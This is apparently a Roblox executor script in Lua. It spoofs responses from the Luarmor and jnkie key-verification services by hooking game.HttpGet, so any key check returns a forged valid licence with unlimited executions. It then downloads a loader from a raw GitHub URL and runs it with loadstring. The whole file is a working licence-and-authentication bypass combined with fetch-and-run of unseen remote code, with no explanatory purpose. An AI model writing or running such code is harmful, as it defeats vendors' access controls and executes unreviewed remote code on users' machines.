local _k = "noKey_" .. tostring(os.time())
script_key, SCRIPT_KEY = _k, _k
_G.script_key, _G.SCRIPT_KEY = _k, _k
if getgenv then getgenv().script_key, getgenv().SCRIPT_KEY = _k, _k end

local _orig = game.HttpGet
local _valid = 'return {code="KEY_VALID",message="ok",data={note="Ad Reward",auth_expire=9999999999,total_executions=999999,executions_left=999999}}'

game.HttpGet = function(self, url, ...)
    if type(url) == "string" and (url:find("luarmor%.net") or url:find("api%.jnkie%.com")) then
        if url:find("check_key") or url:find("/auth/") or url:find("verify") then
            return _valid
        end
        return "return function() end"
    end
    return _orig(self, url, ...)
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/hanniii1/Loader/refs/heads/main/BFLoader.lua"))()
